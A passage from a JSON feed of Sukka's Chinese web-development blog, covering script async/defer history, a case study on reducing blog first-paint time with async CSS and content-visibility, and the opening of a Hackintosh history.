class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\">\n<div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-13</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\">\n<div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-03</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 